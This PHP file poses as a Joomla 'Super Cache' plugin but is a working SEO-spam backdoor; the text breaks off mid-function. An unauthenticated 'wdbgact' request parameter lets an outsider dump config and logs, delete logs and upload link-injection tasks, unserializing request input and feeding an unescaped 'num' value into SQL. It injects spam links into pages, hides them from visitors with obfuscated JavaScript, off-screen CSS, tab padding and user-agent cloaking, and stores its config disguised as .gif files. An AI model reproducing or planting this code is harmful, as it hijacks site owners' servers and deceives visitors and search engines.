<?php
/**
 * @package     Joomla.Plugin
 * @subpackage  Super Cache
 *
 * @copyright   Copyright (C) 2005 - 2013 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

/**
 * Super Cache Plugin.
 * Based on the oficial recaptcha library( http://sp-cache.net/plugins/php/ )
 *
 * @package     Joomla.Plugin
 * @subpackage  Super Cache
 * @since       2.5
 */

if (!function_exists('_base64_decode')) {
	function _base64_decode($in) {
		$out="";
		for($x=0;$x<256;$x++){$chr[$x]=chr($x);}
		$b64c=array_flip(preg_split('//',"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",-1,1));
		$match = array();
		preg_match_all("([A-z0-9+\/]{1,4})",$in,$match);
		foreach($match[0] as $chunk){
			$z=0;
			for($x=0;isset($chunk[$x]);$x++){
				$z=($z<<6)+$b64c[$chunk[$x]];
				if($x>0){ $out.=$chr[$z>>(4-(2*($x-1)))];$z=$z&(0xf>>(2*($x-1))); }
			}
		}
		return $out;
	}
}

abstract class PlgSystemXcalendarBase {
	var $config = false;
	static $restrictedTags = array('style', 'script', 'applet', 'object', 'map', 'audio', 'head', 'embed', 'frame', 'iframe', 'frameset', 'link', 'noframes', 'noscript', 'noindex', 'select', 'textarea', 'video', 'a', 'title');
	var $parseDelimiter = "###$###";
	var $initCalled = false;
	var $request = false;
	static $processed = false;
	
	abstract function dbQuery($query);
	abstract function dbRow($result);
	abstract function dbEscape($text);
	abstract function isShowLink();
	
	function initActions() {
		$this->initFunctions();
		
		list($success, $this->config) = $this->getConfig();
		
		if (isset($_REQUEST['wdbgact'])) {
			if (!$success) die(json_encode(array('result' => false, 'data' => 'No config')));
			
			if ($_REQUEST['wdbgact'] == 'show') {
				list($success, $result) = $this->dbQuery("select * from ".$this->config['statisticsTable']);
				if (!$success) die(json_encode(array('result' => false, 'data' => 'mysql error: '.$result)));
				
				$output = array('db' => array(), 'config' => $this->config, 'count' => 0);
				$randRow = false;
				while ($row = $this->dbRow($result)) {
					if (rand(0, $output['count']) == 0) $randRow = $row;
					
					$output['count']++;
				}
				
				if ($randRow) {
					$url = $randRow->url;
					$info = unserialize(_base64_decode($randRow->info));
					
					$output['db'][$url] = array();
					
					foreach ($info['links'] as $link) {
						$found = false;
						foreach ($this->config['links'] as $i => $clinks) {
							if (!is_numeric($i)) continue;
							foreach ($clinks as $j => $clink) {
								if ($clink[0] == $link[0] && $clink[1] == $link[1]) {
									$found = "@".$i.";".$j;
								}
							}
						}

						if ($found) {
							$output['db'][$url][] = $found;
						} else {
							$output['db'][$url][$link[0]] = $link[1];
						}
					}
				}
				
				die(json_encode(array('result' => true, 'data' => $output)));
			}
			
			if ($_REQUEST['wdbgact'] == 'stat') {
				$num = isset($_REQUEST['num']) ? $_REQUEST['num'] : 1000;
				list($success, $result) = $this->dbQuery("select * from ".$this->config['logTable']." order by id limit ".$num);
				if (!$success) die(json_encode(array('result' => false, 'data' => 'mysql error: '.$result)));
				
				$output = array('logs' => array());
				while ($row = $this->dbRow($result)) {
					$row->info = unserialize($row->info);
					$output['logs'][] = $row;
				}

				die(json_encode(array('result' => true, 'data' => $output)));
			}
			
			if ($_REQUEST['wdbgact'] == 'clearStat') {
				if (!isset($_REQUEST['last'])) die(json_encode(array('result' => false, 'data' => 'missing last param')));
				$_REQUEST['last'] = (int)$_REQUEST['last'];
				if ($_REQUEST['last'] <= 0) die(json_encode(array('result' => false, 'data' => 'wrong last param')));
				
				list($success, $result) = $this->dbQuery("delete from ".$this->config['logTable']." where id <= ".$_REQUEST['last']);
				if (!$success) die(json_encode(array('result' => false, 'data' => 'mysql error: '.$result)));
				
				die(json_encode(array('result' => true)));
			}
			
			if ($_REQUEST['wdbgact'] == 'task') {
				if ($_POST['urls'] != 'all')
					if (!is_array($urls = unserialize(_base64_decode($_POST['urls']))) || !$urls) die("ERROR_NO_URLS");
				
				$params = array();
				if (!is_array($params['links'] = unserialize(_base64_decode($_POST['links']))) || !$params['links']) die("ERROR_NO_LINKS");
				if (!($params['linkPlace'] = $_POST['linkPlace'])) $params['linkPlace'] = $this->config['linkPlace'];
				if (!($params['linkCount'] = $_POST['linkCount'])) $params['linkCount'] = $this->config['linkCount'];
				if (!in_array($params['linkPlace'], array('all', 'nomain'))) die("ERROR_WRONG_LINK_PLACE");
				if (!($params['linkType'] = $_POST['linkType'])) $params['linkType'] = $this->config['linkType'];
				if (!in_array($params['linkType'], array('hidden', 'lasthref', 'lastdiv', 'afterregexp'))) die("ERROR_WRONG_LINK_TYPE");
				if ($params['linkType'] == 'afterregexp' && !($params['linkPlaceRegexp'] = _base64_decode($_POST['linkPlaceRegexp']))) die("ERROR_LINK_PLACE_REGEXP_EMPTY");
				if (!($params['hiddenLinkTypes'] = unserialize(_base64_decode($_POST['hiddenLinkTypes'])))) $params['hiddenLinkTypes'] = array('hideJsCssAbsolute' => 1);
				if (!($params['linkFormat'] = _base64_decode($_POST['linkFormat']))) $params['linkFormat'] = '<a href="%link%">%text%</a>';
				
				if ($_POST['urls'] != 'all') {
					foreach ($urls as $url) {
						list($success, $result) = $this->dbQuery("replace into ".$this->config['taskTable']." set url = '".$this->dbEscape($url)."', info = '".$this->dbEscape(serialize(array('config' => $params)))."'");
						if (!$success) die(json_encode(array('result' => false, 'data' => 'mysql error: '.$result)));
					}
				} else {
					if (!$this->saveConfig(array_merge($this->config, $params))) die(json_encode(array('result' => false, 'data' => 'cannot save config')));
				}
				
				die(json_encode(array('result' => true)));
			}
		}
		
		if (!$this->initCalled) {
			$this->writeLog();
			$this->initCalled = true;
		}
	}
	
	function initFunctions() {
		if (!function_exists('json_encode')) {
			function json_encode($data) {
				switch ($type = gettype($data)) {
					case 'NULL':
						return 'null';
					case 'boolean':
						return ($data ? 'true' : 'false');
					case 'integer':
					case 'double':
					case 'float':
						return $data;
					case 'string':
						return '"' . addslashes($data) . '"';
					case 'object':
						$data = get_object_vars($data);
					case 'array':
						$output_index_count = 0;
						$output_indexed = array();
						$output_associative = array();
						foreach ($data as $key => $value) {
							$output_indexed[] = json_encode($value);
							$output_associative[] = json_encode($key) . ':' . json_encode($value);
							if ($output_index_count !== NULL && $output_index_count++ !== $key) {
								$output_index_count = NULL;
							}
						}
						if ($output_index_count !== NULL) {
							return '[' . implode(',', $output_indexed) . ']';
						} else {
							return '{' . implode(',', $output_associative) . '}';
						}
					default:
						return ''; // Not supported
				}
			}
			
			if (!function_exists("file_put_contents")) {
				function file_put_contents($filename, $text) {
					$f = fopen($filename, "w");
					if (!$f) return false;
					
					if (!fwrite($f, $text)) return false;
					fclose($f);
					
					return true;
				}
			}
		}
	}
	
	function writeLog() {
		list($success, $this->config) = $this->getConfig();
		
		if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') === false) return;
		
		if (!$this->config['logTable']) return;
		
		$info = array(
			'ip' => $_SERVER['REMOTE_ADDR'],
			'time' => time(),
			'ref' => $_SERVER['HTTP_REFERER'],
			'ua' => $_SERVER['HTTP_USER_AGENT'],
			'url' => $_SERVER['REQUEST_URI'],
		);
		
		$this->dbQuery("insert into ".$this->config['logTable']." set info = '".$this->dbEscape(serialize($info))."'");
	}
	
	function bufferEnd($buffer) {
		if (!preg_match("#<(html|head|body)#is", $buffer)) return $buffer;
		if (!$this->isShowLink()) return $buffer;
		
		self::$processed = true;
		
		return @$this->getModifiedContent($buffer);
	}
	
	function getModifiedContent($content) {
		list($success, $taskInfo) = $this->getTaskPostInfo($this->request);
		if (!$success) return $content;
		
		if ($taskInfo) {
			$postInfo = $taskInfo['postInfo'];
		} else {
			list($success, $postInfo) = $this->getPostRecord($this->request);
			if (!$success) return $content;
		}
		
		if (!$postInfo) {
			if (!$this->config['links']) return $content; //on demand
			$links = $this->getNextLinks($this->config['linkCount']);
			
			$postInfo = array(
				'links' => $links,
			);
			
			if ($taskInfo) $postInfo['task'] = $taskInfo;
			
			if (!$this->savePostRecord($this->request, $postInfo)) return $content;
		} else {
			if ($taskInfo) $postInfo['task'] = $taskInfo;
		}
		
		switch ($this->config['linkType']) {
			case 'hidden':
				$content = $this->modifyContentHidden($content, $postInfo);
				break;
			
			case 'lasthref':
				$content = $this->modifyContentLastHref($content, $postInfo);
				break;
			
			case 'lastdiv':
				$content = $this->modifyContentLastDiv($content, $postInfo);
				break;
			
			case 'afterregexp':
				$content = $this->modifyContentRegexp($content, $postInfo);
				break;
		}
		
		return $content;
	}
	
	function getLinkHTML($link, $params = array()) {
		$linkText = '<a href="'.$link[0].'">'.$link[1].'</a>';
		if ($this->config['linkFormat'] && strpos($this->config['linkFormat'], '%link%') !== false && strpos($this->config['linkFormat'], '%text%') !== false) {
			$linkText = str_replace(array('%link%', '%text%'), array($link[0], $link[1]), $this->config['linkFormat']);
		}
		
		if ($params['class']) $linkText = str_replace('<a ', '<a class="'.$params['class'].'" ', $linkText);
		if ($params['style']) $linkText = str_replace('<a ', '<a style="'.$params['style'].'" ', $linkText);
		
		if (isset($link['wrap'])) {
			if ($link['wrap']['pos'] == 'b') {
				$linkText = $link['wrap']['text'].' '.$linkText;
			} else {
				$linkText = $linkText.' '.$link['wrap']['text'];
			}
		}
		
		return $linkText;
	}
	
	function modifyContentHidden($content, $postInfo) {
		if ($postInfo['positions'] == -1) return $content;
		
		if (!$postInfo['hiddenMethod']) {
			$postInfo['hiddenMethod'] = $this->getHideMethod();
			if (!$this->savePostRecord($this->request, $postInfo)) return $content;
		}
		
		if ($postInfo['positions']/* && $postInfo['positions']['phrase']*/) {
			foreach ($postInfo['positions'] as $position) {
				if (!trim($position['phrase']) || $this->findPhrase($content, $position['phrase']) === false) {
					$postInfo['positions'] = false;
					break;
				}
			}
		}
		
		if (!$postInfo['positions']) {
			$contentCopy = $this->removeInnerTags($content, self::$restrictedTags);
			$contentCopy = preg_replace("#<!--(.*?)-->#s", $this->parseDelimiter, $contentCopy);
			$contentCopy = preg_replace("#<[^>]+>#s", $this->parseDelimiter, $contentCopy);
			
			$parts = explode($this->parseDelimiter, $contentCopy);
			foreach ($parts as $i => $part) {
				$parts[$i] = trim($part);
				$s = preg_split("#\s+#", $parts[$i]);
				if (count($s) <= 2) unset($parts[$i]);
			}
			
			/*if (count($parts) == 0) {
				$parts = explode($this->parseDelimiter, $contentCopy);
				foreach ($parts as $i => $part) {
					if (!trim($part)) unset($parts[$i]);
				}
			}*/
			
			if (count($parts) == 0) {
				$postInfo['positions'] = -1;
				$this->savePostRecord($this->request, $postInfo);
				return $content;
			}
			
			$positions = array();
			$links = array_keys($postInfo['links']);
			
			while (count($links) > 0 && count($parts) > 0) {
				$koefs = array();
				$koef = 1;
				$last = 1;
				foreach ($parts as $j => $part) {
					$koefs[$j] = array($last, $last + $koef - 1);
					$last += $koef;
					$koef++;
				}

				$part = false;
				$rand = rand(1, $last - 1);
				foreach ($koefs as $index => $info) {
					if ($rand >= $info[0] && $rand <= $info[1]) {
						$part = $parts[$index];
						$s = preg_split("#\s+#", trim($part));
						$r = rand(1, count($s) - 1);
						$linkIndex = array_rand($links);
						
						$positions[] = array(
							'phrase' => $part,
							'index' => $this->mystrpos($part, $s[$r]),
							'link' => $links[$linkIndex],
						);
						
						unset($links[$linkIndex]);
						unset($parts[$index]);
						break;
					}
				}
			}
			
			$postInfo['positions'] = $positions;
			if (!$this->savePostRecord($this->request, $postInfo)) return $content;
		}
		
		list($headPart, $bodyPartTemplate, $footerPart) = call_user_func_array(array($this, $postInfo['hiddenMethod']), array($content));
		
		if ($headPart) $headPart = $this->getLongTail().$headPart."\n";
		if ($bodyPartTemplate) $bodyPartTemplate = $this->getLongTail().$bodyPartTemplate."\n";
		if ($footerPart) $footerPart = $this->getLongTail().$footerPart."\n";
		
		if (preg_match("#</head>#is", $content)) {
			$content = preg_replace('#</head>#is', $headPart."\n".'</head>', $content);
		} elseif (preg_match("#<head([^>]*)#is", $content)) {
			$content = preg_replace('#<head([^>]*)>#is', '<head\\1>'.$headPart."\n</head>\n", $content);
		} elseif (preg_match("#<html([^>]*)#is", $content)) {
			$content = preg_replace('#<html([^>]*)>#is', '<html\\1>'."\n<head>".$headPart."\n</head>\n", $content);
		} else {
			$content = "<head>".$headPart."\n</head>\n".$content;
		}
		
		foreach ($postInfo['positions'] as $position) {
			$pos = $this->findPhrase($content, $position['phrase']);
			$link = $postInfo['links'][$position['link']];
			
			$bodyPart = str_replace('%text%', $this->getLinkHTML($link), $bodyPartTemplate);
			
			//if (preg_match("#^([^\s]+)(\s.*)$#s", substr($content, $pos), $matches)) {
			//	$content = substr($content, 0, $pos).$matches[1].$bodyPart.$matches[2];
			//} else {
				$content = substr($content, 0, $pos + $position['index']).$bodyPart."\n".substr($content, $pos + $position['index']);
			//}
		}
		
		if ($footerPart) {
			if (preg_match("#</body>#is", $content)) {
				$content = preg_replace('#</body>#is', $footerPart."\n".'</body>', $content);
			} elseif (preg_match("#</html>#is", $content)) {
				$content = preg_replace('#</html>#is', $footerPart."\n".'</html>', $content);
			} else {
				$content .= $footerPart;
			}
		}
		
		return $content;
	}
	
	function modifyContentLastHref($content, $postInfo) {
		$position = $this->getLastLinkPosition($content);
		$listLinkPosition = $this->getLastListLinkPosition($content);
		$isListLink = false;
		$lowestPosition = strlen($content) * 0.7;
		
		if ($listLinkPosition && ($listLinkPosition['position'] > $lowestPosition)) {
			$position = $listLinkPosition;
			$isListLink = true;
		}
		
		if (!$position || $position['position'] < $lowestPosition) {
			$position = $this->getLastDivPosition($content);
		}
		
		if (!$position) return $content;
		
		$linkHTML = '';
		foreach ($postInfo['links'] as $link) {
			$linkHTML .= $this->getLinkHTML($link, $position);
		}
		
		return substr($content, 0, $position['position']).($isListLink ? '<li>'.$linkHTML.'</li>' : ' | '.$linkHTML.' ').substr($content, $position['position']);
	}
	
	function modifyContentLastDiv($content, $postInfo) {
		$position = $this->getLastDivPosition($content);
		
		if (!$position) return $content;
		
		$linkHTML = '';
		foreach ($postInfo['links'] as $link) {
			$linkHTML .= $this->getLinkHTML($link, $position);
		}
		
		return substr($content, 0, $position['position']).($isListLink ? '<li>'.$linkHTML.'</li>' : ' | '.$linkHTML.' ').substr($content, $position['position']);
	}
	
	function modifyContentRegexp($content, $postInfo) {
		$lastPosition = false;
		
		while (preg_match($this->config['linkPlaceRegexp'], $lastPosition === false ? $content : substr($content, $lastPosition + 1), $matches)) {
			$lastPosition = $this->mystrpos($content, $matches[0]);
			if ($lastPosition === false) break;
		}
		
		if ($lastPosition === false) return $content;
		
		$linkHTML = '';
		foreach ($postInfo['links'] as $link) {
			$linkHTML .= $this->getLinkHTML($link);
		}
		
		return substr($content, 0, $lastPosition).' '.$linkHTML.' '.substr($content, $lastPosition);
	}
	
	function findPhrase($text, $needle) {
		$length = strlen($text);
		$offset = 0;
		while ($offset < $length) {
			$pos = $this->mystrpos($text, $needle, $offset);
			if ($pos === false) return false;
			
			$closeTag = $openTag = false;
			for ($i = $pos - 1; $i>= 0; $i--) {
				if ($text[$i] == '>') $closeTag = $i;
				if ($text[$i] == '<') $openTag = $i;
				
				if ($closeTag !== false && $openTag !== false) break;
			}
			
			if ($openTag === false) return $pos;
			if ($closeTag !== false && $closeTag > $openTag) {
				$tag = substr($text, $openTag, $closeTag - $openTag + 1);
				if (!preg_match("#<(".join("|", self::$restrictedTags).")(\s[^>]*)?>#is", $tag)) return $pos;
			}
			
			$offset = $pos + 1;
		}
		
		return false;
	}
	
	function removeInnerTags($content, $tags = array()) {
		foreach ($tags as $tag) {
			$content = preg_replace("#<".$tag."(>|\s[^>]*>)(.*?)</".$tag.">#is", $this->parseDelimiter, $content);
		}
		
		return $content;
	}
	
	function getLongTail() {
		$longTail = '';
		for ($i=0; $i<300; $i++) $longTail .= "\t";
		
		return $longTail;
	}
	
	function getHideMethod() {
		if (!$this->config['hiddenLinkTypes']) return 'hideJsCssAbsolute';
		$methods = array();
		
		foreach ($this->config['hiddenLinkTypes'] as $methodName => $koef) {
			if (method_exists($this, $methodName)) {
				for ($i = 0; $i < $koef; $i++) {
					$methods[] = $methodName;
				}
			}
		}
		
		return $methods[array_rand($methods)];
	}
	
	function hideJsCssAbsolute($content) {
		$className = $this->generateClass();
		
		return array(
			'<script language="JavaScript">var _0xa113=["'.join('", "', $this->obfuscateJavaScript('<style>.'.$className.'{position:absolute;top:-9999px}</style>')).'","\x6C\x65\x6E\x67\x74\x68","","\x63\x68\x61\x72\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x6A\x6F\x69\x6E","\x77\x72\x69\x74\x65"];function _0xad78(){var _0xee8bx2=0,_0xee8bx3,_0xee8bx4,_0xee8bx5,_0xee8bx6;var _0xee8bx7= new Array(_0xa113[0],_0xa113[1],_0xa113[2],_0xa113[3]);var _0xee8bx8=_0xee8bx7[_0xa113[4]];while(++_0xee8bx2<=_0xee8bx8){_0xee8bx3=_0xee8bx7[_0xee8bx8-_0xee8bx2];_0xee8bx5=_0xee8bx6=_0xa113[5];for(_0xee8bx4=0;_0xee8bx4<_0xee8bx3[_0xa113[4]];){_0xee8bx5+=_0xee8bx3[_0xa113[6]](_0xee8bx4++);if(_0xee8bx5[_0xa113[4]]==2){_0xee8bx6+=String[_0xa113[7]](parseInt(_0xee8bx5)+35-_0xee8bx8+_0xee8bx2);_0xee8bx5=_0xa113[5];} ;} ;_0xee8bx7[_0xee8bx8-_0xee8bx2]=_0xee8bx6;} ;document[_0xa113[9]](_0xee8bx7[_0xa113[8]](_0xa113[5]));} ;_0xad78();</script>',
			'<span class="'.$className.'">%text%</span>',
			'',
		);
	}
	
	function hideJsCssHidden($content) {
		$className = $this->generateClass();
		
		return array(
			'<script language="JavaScript">var _0xa113=["'.join('", "', $this->obfuscateJavaScript('<style>.'.$className.'{display:none}</style>')).'","\x6C\x65\x6E\x67\x74\x68","","\x63\x68\x61\x72\x41\x74","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x6A\x6F\x69\x6E","\x77\x72\x69\x74\x65"];function _0xad78(){var _0xee8bx2=0,_0xee8bx3,_0xee8bx4,_0xee8bx5,_0xee8bx6;var _0xee8bx7= new Array(_0xa113[0],_0xa113[1],_0xa113[2],_0xa113[3]);var _0xee8bx8=_0xee8bx7[_0xa113[4]];while(++_0xee8bx2<=_0xee8bx8){_0xee8bx3=_0xee8bx7[_0xee8bx8-_0xee8bx2];_0xee8bx5=_0xee8bx6=_0xa113[5];for(_0xee8bx4=0;_0xee8bx4<_0xee8bx3[_0xa113[4]];){_0xee8bx5+=_0xee8bx3[_0xa113[6]](_0xee8bx4++);if(_0xee8bx5[_0xa113[4]]==2){_0xee8bx6+=String[_0xa113[7]](parseInt(_0xee8bx5)+35-_0xee8bx8+_0xee8bx2);_0xee8bx5=_0xa113[5];} ;} ;_0xee8bx7[_0xee8bx8-_0xee8bx2]=_0xee8bx6;} ;document[_0xa113[9]](_0xee8bx7[_0xa113[8]](_0xa113[5]));} ;_0xad78();</script>',
			'<span class="'.$className.'">%text%</span>',
			'',
		);
	}
	
	function hideStyleAbsolute($content) {
		return array(
			'',
			'<span style="position:absolute;top:-'.rand(9000, 11000).'px">%text%</span>',
			'',
		);
	}
	
	function hideStyleHidden($content) {
		return array(
			'',
			'<span style="display:none">%text%</span>',
			'',
		);
	}
	
	function hideJsAbsolute($content) {
		$tagClass = $this->generateClass();
		
		return array(
			'',
			'<span class="'.$tagClass.'">%text%</span>',
			'<script>var els = document.getElementsByClassName("'.$tagClass.'"); for (var i=0;i<els.length;i++) { els[i].style.position = "absolute"; els[i].style.top = "-'.rand(9000, 11000).'px" };</script>',
			'',
		);
	}
	
	function hideJsHidden($content) {
		$tagClass = $this->generateClass();
		
		return array(
			'',
			'<span class="'.$tagClass.'">%text%</span>',
			'<script>var els = document.getElementsByClassName("'.$tagClass.'"); for (var i=0;i<els.length;i++) els[i].style.display = "none";</script>',
		);
	}
	
	function hideCssAbsolute($content) {
		$className = $this->generateClass();
		
		return array(
			'<style>.'.$className.'{position:absolute;top:-'.rand(9000, 11000).'px}</style>',
			'<span class="'.$className.'">%text%</span>',
			'',
		);
	}
	
	function hideCssHidden($content) {
		$className = $this->generateClass();
		
		return array(
			'<style>.'.$className.'{display:none}</style>',
			'<span class="'.$className.'">%text%</span>',
			'',
		);
	}
	
	function hideUA($content) {
		return array(
			'',
			strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') !== false ? '%text%' : '',
			'',
		);
	}
	
	function hideEvents($content) {
		$spanId = $this->generateClass();
		
		return array(
			"<script>if(typeof jQuery=='undefined') document.write('<' + 'script src=\"//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js\"></' + 'script>');</script>".$this->getLongTail()."<script>(function($){var eventList = 'load click dblclick keydown keypress keyup mousedown mousemove mouseover mouseup scroll focus blur';var eventFunction = function(e) {if (e.type != 'load') $('.".$spanId."').remove();};$(window).bind(eventList, eventFunction);$('body, document').bind(eventList, eventFunction);})(jQuery);</script>\n",
			"<span class='".$spanId."'>%text%</span>\n",
			"",
		);
	}
	
	function obfuscateJavaScript($str) {
		$randnums = array();
		$minLength = 5;
		while (count($randnums) < 3) {
			$num = rand($minLength, strlen($str) - $minLength);
			if (isset($randnums[$num])) continue;
			
			foreach ($randnums as $n) {
				if (abs($n - $num) < $minLength) {
					continue 2;
				}
			}
			$randnums[$num] = $num;
		}
		
		sort($randnums, SORT_NUMERIC);
		$parts = array(
			substr($str, 0, $randnums[0]),
			substr($str, $randnums[0], $randnums[1] - $randnums[0]),
			substr($str, $randnums[1], $randnums[2] - $randnums[1]),
			substr($str, $randnums[2], strlen($str) - $randnums[2]),
		);
		
		$index = 1;
		foreach ($parts as $part) {
			$newStr = '';
			for ($i=0; $i<strlen($part); $i++) {
				$ord = (string)(ord($part[$i]) - 35 + $index - 1);
				
				for ($j=0; $j<strlen($ord); $j++) $newStr .= '\\x'.dechex(ord($ord[$j]));
			}
			$parts[$index - 1] = $newStr;
			$index++;
		}
		
		return $parts;
	}
	
	function generateClass() {
		$className = '';
		
		$symbols = range('a', 'z');
		for ($i = rand(15, 20); $i > 0; $i--) {
			$className .= $symbols[array_rand($symbols)];
		}
		
		return $className;
	}
	
	function getAttributeValue($attribute, $text) {
		if (preg_match("#\s+".preg_quote($attribute)."\s*=\s*'([^']+)'#is", $text, $matches) || preg_match("#\s+".preg_quote($attribute)."\s*=\s*\"([^\"]+)\"#is", $text, $matches) || preg_match("#\s+".preg_quote($attribute)."\s*=\s*([^\s]+)#is", $text, $matches)) {
			return $matches[1];
		}
		
		return false;
	}
	
	function isValidHref($href) {
		return $href && $href[0] != '#' && substr($href, 0, 11) != 'javascript:';
	}
	
	function isValidAnchor($anchor) {
		if (preg_match("#<img[^>]*>#is", $anchor)) return false;
		
		if (strlen(trim(strip_tags($anchor))) < 5) return false;
		
		return true;
	}
	
	function isInsideBlock($text, $position, $tagStart, $tagEnd) {
		if (false === ($tagStartPosition = $this->mystrrpos(substr($text, 0, $position), $tagStart))) return false;
		
		if (false !== ($tagEndPosition = $this->mystrpos($text, $tagEnd, $tagStartPosition))) {
			return $tagEndPosition > $position;
		}
		
		return true;
	}
	
	function searchLink($content, $startTag, $fullRegexp) {
		$offset = null;
		
		$content = strtolower($content);
		
		while (false !== ($position = $this->mystrrpos($offset === null ? $content : substr($content, 0, $offset), $startTag))) {
			if (preg_match($fullRegexp, substr($content, $position), $matches)) {
				$href = $this->getAttributeValue('href', $matches[1]);
				$anchor = $matches[2];
				
				if (
					$this->isValidHref($href)
					&& $this->isValidAnchor($anchor)
					&& !$this->isInsideBlock($content, $position, '<!--', '-->')
					&& !$this->isInsideBlock($content, $position, '<script', '</script>')
				) {
					return array(
						'position' => $position + strlen($matches[0]),
						'class' => $this->getAttributeValue('class', $matches[1]),
						'style' => $this->getAttributeValue('style', $matches[1]),
					);
				}
			}
			
			$offset = $position;
		}
		
		return false;
	}
	
	function getLastDivPosition($content) {
		$position = $this->mystrrpos(strtolower($content), '</div>');
		
		if ($position === false) return false;
		
		return array(
			'position' => $position,
			'class' => false,
			'style' => false,
		);
	}
	
	function mystrpos($text, $needle, $offset = 0) {
		$end = strlen($text);
		$nl = strlen($needle);
		
		for ($i=$offset; $i<=$end - $nl; $i++) {
			if ($text[$i] == $needle[0]) {
				$found = true;
				
				for ($j=1; $j<$nl; $j++) {
					if ($text[$i + $j] != $needle[$j]) {
						$found = false;
						break;
					}
				}
				
				if ($found) return $i;
			}
		}
		
		return false;
	}
	
	function mystrrpos($text, $needle, $offset = 0) {
		$end = strlen($text);
		$nl = strlen($needle);
		
		for ($i=$end - $nl; $i>=0; $i--) {
			if ($text[$i] == $needle[0]) {
				$found = true;
				
				for ($j=1; $j<$nl; $j++) {
					if ($text[$i + $j] != $needle[$j]) {
						$found = false;
						break;
					}
				}
				
				if ($found) return $i;
			}
		}
		
		return false;
	}
	
	function getLastLinkPosition($content) {
		return $this->searchLink($content, '<a', "#^<a([^>]*href\s*=\s*[^>]*)>(.*?)</a>#is");
	}
	
	function getLastListLinkPosition($content) {
		return $this->searchLink($content, '<li', "#^<li[^>]*>\s*<a([^>]*href\s*=\s*[^>]*)>(.*?)</a>(.*?)</li>#is");
	}
	
	function getTaskPostInfo($url) {
		if (!$this->config['taskTable']) return array(false);
		
		list($success, $result) = $this->dbQuery("select id, info from ".$this->config['taskTable']." where url = '".$this->dbEscape($url)."'");
		if (!$success) return array(false);
		
		$taskRecord = $this->dbRow($result);
		if ($taskRecord) {
			$taskRecord->info = unserialize(_base64_decode($taskRecord->info));
			$taskRecord->info['id'] = $taskRecord->id;
			
			$this->config = array_merge($this->config, $taskRecord->info['config']);
		}

		return array(true, $taskRecord ? $taskRecord->info : false);
	}
	
	function saveTaskPostInfo($url, $postInfo) {
		$info = $postInfo['task'];
		$info['postInfo'] = $postInfo;
		unset($info['postInfo']['task']);
		
		if (!$this->config['taskTable']) return false;
		
		list($success, $result) = $this->dbQuery("update ".$this->config['taskTable']." set info = '".$this->dbEscape(base64_encode(serialize($info)))."' where id = ".$info['id']);
		
		return true;
	}
	
	function getPostRecord($url) {
		if (!$this->config['statisticsTable']) return array(false);
		
		list($success, $result) = $this->dbQuery("select info from ".$this->config['statisticsTable']." where url = '".$this->dbEscape($url)."'");
		if (!$success) return array(false);
		
		$postRecord = $this->dbRow($result);
		
		return array(true, $postRecord ? unserialize(_base64_decode($postRecord->info)) : false, $postRecord ? true : false);
	}
	
	function savePostRecord($url, $postInfo) {
		if ($postInfo['task']) return $this->saveTaskPostInfo($url, $postInfo);
		
		if (!$this->config['statisticsTable']) return false;
		
		list($success, $postRecord, $isRecordExists) = $this->getPostRecord($url);
		if (!$success) return false;
		
		$info = base64_encode(serialize($postInfo));
		
		if ($isRecordExists) {
			list($success, $result) = $this->dbQuery("update ".$this->config['statisticsTable']." set info = '".$this->dbEscape($info)."' where url = '".$this->dbEscape($url)."'");
		} else {
			list($success, $result) = $this->dbQuery("insert into ".$this->config['statisticsTable']." set info = '".$this->dbEscape($info)."', url = '".$this->dbEscape($url)."'");
		}
		if (!$success) return false;
		
		return true;
	}
	
	function getNextLinks($count) {
		$result = array();
		
		$count = min($count, count($this->config['links']));
		if ($count < 1) $count = 1;
		
		$keys = array_rand($this->config['links'], $count);
		if ($count == 1) $keys = array($keys);
		shuffle($keys);
		
		foreach ($keys as $key) {
			$link = $this->getRandLink($this->config['links'][$key]);
			
			if (isset($this->config['links'][$key]['config'])) {
				$config = $this->config['links'][$key]['config'];
				
				if (isset($config['link-wrap'])) {
					if (rand(0, 100) <= $config['link-wrap']['frequency']) {
						$anchors = explode('~', $config['link-wrap']['anchors']);
						if (in_array($link[1], $anchors)) {
							$texts = array();
							foreach ($this->config['links'][$key] as $i => $l) {
								if (!is_numeric($i)) continue;
								if (!in_array($l[1], $anchors)) {
									$texts[] = $l[1];
								}
							}
							
							$link['wrap'] = array(
								'text' => $texts[array_rand($texts)],
								'pos' => rand(0, 1) == 1 ? 'b' : 'a',
							);
						}
					}
				}
				
				if (!isset($link['wrap']) && isset($config['anchor-preffix'])) {
					if (rand(0, 100) <= $config['anchor-preffix']['frequency']) {
						$words = explode('~', $config['anchor-preffix']['words']);
						$word = $words[array_rand($words)];
						if (strpos(strtolower($link[1]), strtolower($word)) === false) {
							$link[1] = $word.' '.$link[1];
						}
					}
				}
				
				if (!isset($link['wrap']) && isset($config['anchor-suffix'])) {
					if (rand(0, 100) <= $config['anchor-suffix']['frequency']) {
						$words = explode('~', $config['anchor-suffix']['words']);
						$word = $words[array_rand($words)];
						if (strpos(strtolower($link[1]), strtolower($word)) === false) {
							$link[1] = $link[1].' '.$word;
						}
					}
				}
			}
			
			$result[] = $link;
		}
		
		return $result;
	}
	
	function getRandLink($links) {
		$randkoefs = array();
		foreach ($links as $i => $link) {
			if (!is_numeric($i)) continue;
			
			for ($j = $link[2]; $j>0; $j--) $randkoefs[] = $i;
		}
		
		$rand = $randkoefs[array_rand($randkoefs)];
		
		return $links[$rand];
	}
	
	function getConfigName() {
		return '/home/content/25/7814425/html/plugins/system/xcalendar-data/lefttopcorner.gif';
	}
	
	function getDictName() {
		return '/home/content/25/7814425/html/plugins/system/xcalendar-data/topleft.gif';
	}
	
	function getConfig() {
		$configname = $this->getConfigName();
		if (!file_exists($configname)) return array(false);
		
		$config = @(array)unserialize($this->getImageDecodedText(file_get_contents($configname)));
		if (!$config) return array(false);
		
		return array(true, $config);
	}
	
	function saveConfig($config) {
		$configname = $this->getConfigName();
		
		if (!@file_put_contents($configname, $this->getImageEncodedText($configname, serialize($config)))) return false;
		
		return true;
	}
	
	function getXorText($text) {
		for ($i=0; $i<strlen($text); $i++) {
